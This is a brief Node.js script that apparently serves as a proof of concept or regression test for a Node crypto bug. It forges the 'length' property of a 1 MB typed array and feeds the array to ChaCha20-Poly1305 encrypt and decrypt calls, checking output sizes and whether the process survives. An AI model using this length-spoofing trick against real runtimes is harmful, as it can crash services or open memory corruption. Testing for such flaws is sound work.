import crypto from "node:crypto";

function spoofed() {
  const input = new Uint8Array(1024 * 1024);
  input.fill(0x41);
  Object.defineProperty(input, "length", { value: 1 });
  return input;
}

const encipher = crypto.createCipheriv(
  "chacha20-poly1305",
  new Uint8Array(32),
  new Uint8Array(12),
  { authTagLength: 16 },
);
console.log("encrypt output length:", encipher.update(spoofed()).length);

const decipher = crypto.createDecipheriv(
  "chacha20-poly1305",
  new Uint8Array(32),
  new Uint8Array(12),
  { authTagLength: 16 },
);
console.log("decrypt output length:", decipher.update(spoofed()).length);

console.log("Process still alive");
